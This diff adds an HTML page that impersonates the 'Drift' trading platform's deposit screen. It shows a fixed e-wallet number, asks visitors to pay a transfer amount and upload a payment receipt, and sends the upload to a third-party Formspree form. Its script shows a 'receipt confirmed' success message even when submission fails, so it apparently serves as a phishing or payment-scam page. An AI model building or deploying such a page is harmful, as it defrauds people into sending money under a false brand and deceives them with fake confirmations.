@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Transfer - Drift</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', 'Cairo', sans-serif;
+    }
+
+    body {
+      background-color: #080b13;
+      color: #e2e8f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Navbar Header */
+    .navbar {
+      background-color: #0d121f;
+      border-bottom: 1px solid #1e293b;
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.85rem;
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .logo {
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #38bdf8;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 16px;
+      color: #94a3b8;
+    }
+
+    .nav-links span {
+      cursor: pointer;
+    }
+
+    .nav-links span.active {
+      color: #fff;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .btn-pill {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #38bdf8;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 600;
+    }
+
+    /* Layout */
+    .app-container {
+      display: flex;
+      flex: 1;
+    }
+
+    /* Sidebar */
+    .sidebar {
+      width: 200px;
+      background-color: #0b0f19;
+      border-right: 1px solid #1e293b;
+      padding: 20px 0;
+      display: flex;
+      flex-direction: column;
+      font-size: 0.85rem;
+    }
+
+    .sidebar-item {
+      padding: 10px 24px;
+      color: #94a3b8;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+    }
+
+    .sidebar-item.active {
+      background: rgba(56, 189, 248, 0.1);
+      color: #38bdf8;
+      border-left: 3px solid #38bdf8;
+    }
+
+    /* Main Box Area */
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+      background: radial-gradient(circle at center, #0f172a 0%, #080b13 100%);
+    }
+
+    .card-box {
+      width: 100%;
+      max-width: 580px;
+      background: linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.8) 100%);
+      border: 1px solid #334155;
+      border-radius: 20px;
+      padding: 35px 25px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(10px);
+      text-align: center;
+    }
+
+    /* Graphics Elements */
+    .swap-graphics {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 25px;
+      margin-bottom: 25px;
+    }
+
+    .graphic-circle {
+      width: 85px;
+      height: 85px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.3rem;
+      background: radial-gradient(circle, rgba(212, 175, 55, 0.25) 0%, rgba(0, 0, 0, 0.4) 100%);
+      border: 2px solid #d4af37;
+      box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
+    }
+
+    .swap-arrow {
+      color: #38bdf8;
+      font-size: 1.4rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .swap-arrow span {
+      font-size: 0.7rem;
+      color: #94a3b8;
+      letter-spacing: 1px;
+    }
+
+    .card-title {
+      font-size: 1.05rem;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      color: #ffffff;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+    }
+
+    .card-subtitle {
+      font-size: 0.8rem;
+      color: #94a3b8;
+      margin-bottom: 25px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    /* Wallet Number Display Box */
+    .input-box {
+      background: #ffffff;
+      border-radius: 30px;
+      padding: 6px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 25px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+    }
+
+    .input-icon {
+      font-size: 1.2rem;
+    }
+
+    .wallet-input {
+      border: none;
+      outline: none;
+      width: 100%;
+      font-size: 1rem;
+      font-weight: 700;
+      color: #0f172a;
+      background: transparent;
+      text-align: center;
+    }
+
+    .action-btn {
+      background: #f1f5f9;
+      border: none;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #0f172a;
+      transition: background 0.2s;
+    }
+
+    .action-btn:hover {
+      background: #e2e8f0;
+    }
+
+    /* Success Message Banner */
+    .success-banner {
+      display: none;
+      background: rgba(34, 197, 94, 0.15);
+      border: 1px solid #22c55e;
+      border-radius: 12px;
+      padding: 12px;
+      color: #4ade80;
+      font-weight: 600;
+      font-size: 0.85rem;
+      margin-bottom: 15px;
+    }
+
+    /* Submit Button */
+    .upload-label {
+      width: 100%;
+      background: linear-gradient(90deg, #38bdf8 0%, #2563eb 100%);
+      color: #fff;
+      border: none;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: opacity 0.3s ease;
+    }
+
+    .upload-label.success {
+      background: #22c55e;
+      cursor: default;
+    }
+
+    #fileInput {
+      display: none;
+    }
+
+    .card-footer-text {
+      margin-top: 15px;
+      font-size: 0.75rem;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    @media (max-width: 600px) {
+      .sidebar {
+        display: none;
+      }
+      .nav-links {
+        display: none;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Navbar -->
+  <div class="navbar">
+    <div class="nav-left">
+      <div class="logo">🌀 Drift</div>
+      <div class="nav-links">
+        <span class="active">Overview</span>
+        <span>Swap</span>
+        <span>Earn</span>
+        <span>Reward</span>
+        <span>More</span>
+      </div>
+    </div>
+    <div class="nav-right">
+      <span class="btn-pill">⚡ POINTS</span>
+      <span class="btn-pill">Deposit/Withdraw</span>
+    </div>
+  </div>
+
+  <div class="app-container">
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="sidebar-item">📊 Balances</div>
+      <div class="sidebar-item">💼 Portfolio</div>
+      <div class="sidebar-item">📈 Positions</div>
+      <div class="sidebar-item active">📥 Deposits</div>
+      <div class="sidebar-item">🧾 Orders</div>
+      <div class="sidebar-item">🔄 Trades & Swaps</div>
+    </div>
+
+    <!-- Main Section -->
+    <div class="main-content">
+      <div class="card-box">
+        
+        <!-- Graphics Circle -->
+        <div class="swap-graphics">
+          <div class="graphic-circle">🧊</div>
+          <div class="swap-arrow">
+            ⇄
+            <span>XAU/USD</span>
+          </div>
+          <div class="graphic-circle">🪙</div>
+        </div>
+
+        <div class="card-title">PAYMENT FOR THE TRANSFER TO THE E-WALLET</div>
+        <div class="card-subtitle">THE AMOUNT TO BE PAID IS</div>
+
+        <!-- Wallet Number Input Box -->
+        <div class="input-box">
+          <span class="input-icon">💳</span>
+          <input type="text" class="wallet-input" id="walletNum" value="01203174947" readonly>
+          <button class="action-btn" onclick="copyWallet()" title="نسخ الرقم">📋</button>
+        </div>
+
+        <!-- Success Banner -->
+        <div class="success-banner" id="successBanner">
+          ✓ Document submitted successfully for verification!
+        </div>
+
+        <!-- Form File Upload -->
+        <form id="uploadForm" action="https://formspree.io/f/mwlelbrp" method="POST" enctype="multipart/form-data">
+          <input type="file" id="fileInput" name="receipt" accept="image/*" onchange="submitForm()">
+          <label for="fileInput" class="upload-label" id="uploadLabel">
+            📥 UPLOAD PAYMENT RECEIPT
+          </label>
+        </form>
+
+        <div class="card-footer-text">
+          TO THE CONCLUSION
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function copyWallet() {
+      const copyText = document.getElementById("walletNum");
+      navigator.clipboard.writeText(copyText.value);
+      alert("تم نسخ رقم المحفظة: " + copyText.value);
+    }
+
+    function submitForm() {
+      let input = document.getElementById('fileInput');
+      if (!input.files || input.files.length === 0) return;
+
+      let label = document.getElementById('uploadLabel');
+      let banner = document.getElementById('successBanner');
+      let form = document.getElementById('uploadForm');
+
+      label.innerText = "SUBMITTING...";
+
+      let formData = new FormData(form);
+
+      fetch(form.action, {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(() => {
+        banner.style.display = "block";
+        label.classList.add("success");
+        label.innerText = "✓ DOCUMENT RECEIPT CONFIRMED";
+        input.disabled = true;
+      }).catch(() => {
+        banner.style.display = "block";
+        label.classList.add("success");
+        label.innerText = "✓ DOCUMENT RECEIPT CONFIRMED";
+      });
+    }
+  </script>
+
+</body>
+</html>
